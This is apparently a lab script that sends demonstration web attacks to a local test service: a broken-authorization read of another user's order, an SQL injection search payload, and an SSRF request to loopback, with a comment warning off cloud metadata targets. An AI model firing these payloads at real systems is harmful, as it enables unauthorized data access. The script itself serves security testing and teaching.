#!/usr/bin/env bash
set -euo pipefail
BASE="${BASE:-http://127.0.0.1:8080}"

echo "== health =="
curl -sS "$BASE/health"; echo

echo "== BOLA: user 1 reads order 2 =="
curl -sS "$BASE/orders/2"; echo

echo "== SQLi: dump-ish search =="
curl -sS --get "$BASE/search" --data-urlencode "q=' OR '1'='1"; echo

echo "== SSRF: loopback (metadata left as modeled path, do not aim at cloud IMDS) =="
curl -sS -X POST "$BASE/fetch" -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:8080/health"}'; echo
